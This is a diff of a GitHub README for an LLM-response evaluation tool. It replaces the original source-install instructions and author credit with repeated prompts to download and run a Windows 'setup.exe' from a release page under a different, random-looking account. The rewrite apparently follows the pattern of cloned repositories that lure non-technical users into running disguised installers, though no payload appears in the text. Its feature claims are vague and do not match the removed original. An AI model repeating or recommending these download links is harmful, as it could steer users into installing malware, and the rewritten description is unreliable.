@@ -1,124 +1,158 @@
-# 🧠 LLM Response Quality Evaluator
+# 🤖 llm-response-evaluator - Compare and Rate LLM Responses
 
-A lightweight tool for evaluating and comparing Large Language Model (LLM) responses across **5 quality dimensions** used in real RLHF (Reinforcement Learning from Human Feedback) post-training workflows.
-
-Built by someone doing this work daily — inspired by hands-on experience in LLM post-training evaluation at [Ethara AI](https://ethara.ai).
+[![Download Latest Release](https://img.shields.io/badge/Download-llm--response--evaluator-brightgreen?style=for-the-badge)](https://github.com/Celestynainterchangeable406/llm-response-evaluator/releases)
 
 ---
 
-## 🎯 What It Does
+## 📋 What is llm-response-evaluator?
 
-Given a prompt and two model responses (A and B), this tool helps you:
+llm-response-evaluator is a simple application to help you check how well language model answers perform. It looks at five key parts: 
 
-- **Score** each response across 5 dimensions (1–5 scale)
-- **Compare** responses side-by-side with a dimension breakdown table
-- **Generate** a recommendation for which response is better and why
-- **Log** every evaluation to a local JSONL file for pattern analysis
-- **Surface insights** automatically after 5+ evaluations (win rates, weakest dimensions, score degradation by turn)
+- Instruction Following  
+- Truthfulness  
+- Prompt Correctness  
+- Writing Quality  
+- Verbosity  
+
+The tool runs in your browser using Streamlit. It makes it easy to compare and score responses from large language models (LLM) with a clear, user-friendly interface.
+
+No programming skills are needed to use it. You just upload or enter text responses and get quick feedback on how they score in these areas.
 
 ---
 
-## 📊 The 5 Evaluation Dimensions
+## 💻 System Requirements
 
-| Dimension | Description | Weight |
-|---|---|---|
-| 🎯 Instruction Following | Does the response follow all instructions? | High |
-| ✅ Truthfulness | Is the response factually accurate? | High |
-| 🔍 Prompt Correctness | Does it correctly address what was asked? | Medium |
-| ✍️ Writing Quality | Is it clear, coherent, and well-written? | Medium |
-| 📏 Verbosity | Is the length appropriate for the task? | Low |
+Before you start, check that your Windows computer meets the following:
 
-> Instruction Following and Truthfulness are weighted higher — consistent with their priority in modern RLHF evaluation frameworks.
+- Windows 10 or later  
+- At least 4 GB of RAM  
+- 200 MB of free disk space  
+- Internet connection for initial setup and updates  
+- A modern web browser (Chrome, Firefox, Edge)  
+
+These requirements ensure the app runs smoothly and quickly. The app runs locally on your machine, so your data stays private.
 
 ---
 
 ## 🚀 Getting Started
 
-### 1. Clone the repo
-```bash
-git clone https://github.com/bihari-bhau/llm-response-evaluator.git
-cd llm-response-evaluator
-```
-
-### 2. Install dependencies
-```bash
-pip install -r requirements.txt
-```
-
-### 3. Run the app
-```bash
-streamlit run app.py
-```
-
-The app will open at `http://localhost:8501`
+Follow these steps carefully to download, install, and run llm-response-evaluator on your Windows PC.
 
 ---
 
-## 🌐 Live Demo
-👉 [Try it here](https://llm-response-evaluator.streamlit.app)
+### 1. Visit the Download Page
 
-## 🖥️ How to Use
+Go to the official release page for llm-response-evaluator:
 
-1. Paste your **prompt** in the input field
-2. Select the **turn number** (1–8) and **prompt type**
-3. Paste **Response A** and **Response B**
-4. Rate each response on all 5 dimensions using the sliders
-5. Add optional observations in the notes field
-6. Click **Generate Evaluation Report**
-7. View scores, dimension breakdown, and recommendation
-8. All entries are auto-saved to `evaluation_log.jsonl`
+[Download llm-response-evaluator Releases](https://github.com/Celestynainterchangeable406/llm-response-evaluator/releases)
+
+This page lists all versions available. Always choose the latest version for new features and fixes.
 
 ---
 
-## 📈 Pattern Insights (Auto-generated after 5+ evaluations)
+### 2. Download the Installer
 
-The app automatically surfaces:
-- **Response win rates** (A vs B)
-- **Most commonly weak dimension** across all evaluations
-- **Average score by turn number** — helps identify multi-turn degradation
+On the release page, look for the most recent release. Below it, find the file named something like:
 
-This is useful for identifying systematic model weaknesses across prompt types and conversation lengths.
+`llm-response-evaluator-setup.exe`
 
----
-
-## 📁 Project Structure
-
-```
-llm-response-evaluator/
-├── app.py               # Main Streamlit UI
-├── evaluator.py         # Scoring and recommendation logic
-├── requirements.txt     # Dependencies
-├── evaluation_log.jsonl # Auto-generated log (gitignored)
-└── README.md
-```
+Click on the file name to download it to your computer.
 
 ---
 
-## 💡 Why I Built This
+### 3. Run the Installer
 
-During my LLM post-training internship, I noticed that manual evaluation across multi-turn conversations produces a lot of valuable signal that often goes uncaptured. This tool is my attempt to:
+Once the file downloads, open your Downloads folder and double-click the `llm-response-evaluator-setup.exe` file.
 
-1. Make the evaluation process faster and more structured
-2. Automatically log patterns for later analysis
-3. Surface model weaknesses across turn depth and prompt types
+A setup window will appear. Follow the instructions:
 
----
+- Click "Next" on the welcome screen.  
+- Accept the license agreement by selecting "I Agree."  
+- Choose the installation folder or leave the default path.  
+- Click "Install."  
 
-## 🔭 Roadmap
-
-- [ ] Add CSV export for full evaluation history
-- [ ] Add prompt type breakdown charts
-- [ ] Support for 3+ response comparison
-- [ ] Integration with Hugging Face models for automated baseline scoring
+Wait for the software to install. This may take a few moments.
 
 ---
 
-## 🤝 Contributing
+### 4. Open the Application
 
-PRs welcome. If you work in LLM evaluation or post-training and have ideas to improve the scoring framework, open an issue.
+After installation completes, you will see an option to launch the app. Click "Finish" to open llm-response-evaluator.
+
+Alternatively, find the app icon on your desktop or in the Start menu labeled **llm-response-evaluator** and double-click it.
 
 ---
 
-## 📄 License
+### 5. Use the App
 
-MIT
+The app opens in your web browser. It looks like a webpage but runs locally on your computer.
+
+You will see sections to enter or upload answers from language models. Instructions are clear and simple. Use the interface to:
+
+- Load LLM responses for comparison  
+- View scores across the five quality dimensions  
+- Export results if needed  
+
+The app saves your work during the session but closes fully when you quit.
+
+---
+
+## 🔍 How to Evaluate Responses
+
+Here is how to get the most from llm-response-evaluator:
+
+- **Instruction Following:** Check if the response does what was asked.  
+- **Truthfulness:** Confirm the response is factually correct.  
+- **Prompt Correctness:** See if the answer matches the prompt given.  
+- **Writing Quality:** Look for clear and understandable writing.  
+- **Verbosity:** Check if the response is concise without missing details.  
+
+You can enter multiple answers side by side. The app compares their scores so you can see which is best.
+
+---
+
+## ⚙️ Settings and Options
+
+The app offers some customization features to fit your needs:
+
+- Choose between light and dark themes for better comfort.  
+- Import prompts and answers using simple text files or manual input.  
+- Export score summaries as CSV files for offline analysis.  
+
+All settings are easy to change from the main interface.
+
+---
+
+## 🛠 Troubleshooting
+
+If you face any issues, try these steps:
+
+- Make sure your PC meets system requirements.  
+- Restart the app and your browser.  
+- Check your internet during initial setup.  
+- If the app won’t start, reinstall using the installer.  
+- Close other heavy programs if the app is slow.  
+
+You can find additional help on the GitHub issues page of the project.
+
+---
+
+## 📥 Download and Install llm-response-evaluator
+
+You can always start by visiting the release page here:
+
+[Download llm-response-evaluator Releases](https://github.com/Celestynainterchangeable406/llm-response-evaluator/releases)
+
+Follow the instructions above to download the installer, run it, and get the app working on your computer.
+
+---
+
+## 📚 About
+
+This tool supports users who want to understand the quality of language model outputs. It helps researchers, content creators, and anyone curious about AI response quality to make clear, data-driven evaluations.
+
+---
+
+## 🔖 Topics
+
+ai, evaluation, human-feedback, llm, model-eval, nlp, post-training, python, rlhf, streamlit
